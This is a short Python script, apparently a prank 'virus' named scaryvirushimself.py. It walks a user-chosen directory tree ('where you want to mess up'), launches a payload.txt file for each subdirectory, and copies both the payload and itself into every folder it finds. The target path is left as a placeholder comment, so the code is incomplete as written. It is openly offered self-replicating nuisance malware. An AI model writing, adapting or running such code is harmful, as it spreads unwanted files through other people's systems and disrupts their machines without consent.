import os
import shutil
from sys import argv

script = argv
name = str(script[0])

importante = #MAKE THIS VARIABLE EQUAL TO WHERE YOU WANT TO MESS UP. WRITE IT LIKE r'*file\\path*'
for(path, dirs, files) in os.walk(importante):
    print(dirs)

    for dir in dirs:  
        porque = str(dirs)
        aveces = os.path.join(path, dir) 
        
        os.system(r"start payload.txt")
        shutil.copy(r"*WHERE_PAYLOAD.TXT_IS*\payload.txt", aveces)
        shutil.copy(r"*WHERE_scaryvirushimself.py_IS*\scaryvirushimself.py", aveces)
        
    print("**************")

